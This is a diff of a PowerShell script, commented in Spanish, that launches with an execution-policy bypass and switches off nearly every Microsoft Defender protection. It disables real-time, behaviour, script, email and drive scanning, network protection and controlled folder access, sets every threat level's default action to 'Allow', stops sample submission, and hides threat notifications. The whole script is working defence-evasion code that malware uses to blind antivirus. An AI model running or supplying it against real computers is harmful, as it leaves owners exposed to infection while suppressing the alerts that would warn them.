@@ -7,29 +7,48 @@ Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Comm
 # Desactiva las notificaciones de Windows Defender antes de realizar cambios
 Set-MpPreference -UILockdown $true          # Desactiva las notificaciones de amenazas graves
 
-# Desactiva la supervisión en tiempo real
+# Desactivar la protección en tiempo real
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Desactiva el monitoreo de comportamiento
+# Desactivar el monitoreo de comportamiento
 Set-MpPreference -DisableBehaviorMonitoring $true
 
-# Desactiva la protección contra amenazas recién encontradas (Block at First Sight)
-Set-MpPreference -DisableBlockAtFirstSeen $true
-
-# Desactiva la protección antivirus de IO
-Set-MpPreference -DisableIOAVProtection $true
-
-# Desactiva el modo de privacidad
-Set-MpPreference -DisablePrivacyMode $true
-
-# Desactiva el sistema de prevención de intrusiones
-Set-MpPreference -DisableIntrusionPreventionSystem $true
-
-# Desactiva el escaneo de scripts
+# Desactivar el escaneo de scripts
 Set-MpPreference -DisableScriptScanning $true
 
-# Desactiva el acceso controlado a carpetas
-Set-MpPreference -EnableControlledFolderAccess Disabled
+# Desactivar la protección de red
+Set-MpPreference -EnableNetworkProtection 0
 
-# Establece la protección de red en modo de auditoría
-Set-MpPreference -EnableNetworkProtection AuditMode
+# Desactivar la protección de carpetas controladas
+Set-MpPreference -EnableControlledFolderAccess 0
+
+# Desactivar la protección contra aplicaciones potencialmente no deseadas
+Set-MpPreference -PUAProtection 0
+
+# Desactivar el escaneo de dispositivos removibles
+Set-MpPreference -DisableRemovableDriveScanning $true
+
+# Desactivar el escaneo de archivos de red en escaneos completos
+Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
+
+# Desactivar el escaneo de archivos de correo electrónico
+Set-MpPreference -DisableEmailScanning $true
+
+# Desactivar la protección IOAV
+Set-MpPreference -DisableIOAVProtection $true
+
+# Deshabilitar el uso del proxy exclusivamente
+Set-MpPreference -ForceUseProxyOnly $false
+
+# Configurar la acción predeterminada para amenazas graves a "Permitir" (Cuidado con esto)
+Set-MpPreference -HighThreatDefaultAction 6  # 6 es generalmente para "Permitir", dependiendo del sistema puede variar
+
+# Configurar la acción predeterminada para amenazas moderadas y bajas a "Permitir"
+Set-MpPreference -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6
+
+# Desactivar la recopilación de muestras
+Set-MpPreference -SubmitSamplesConsent 0
+
+# Guardar los cambios y reiniciar los servicios necesarios para que los cambios tengan efecto
+Restart-Service WinDefend
+
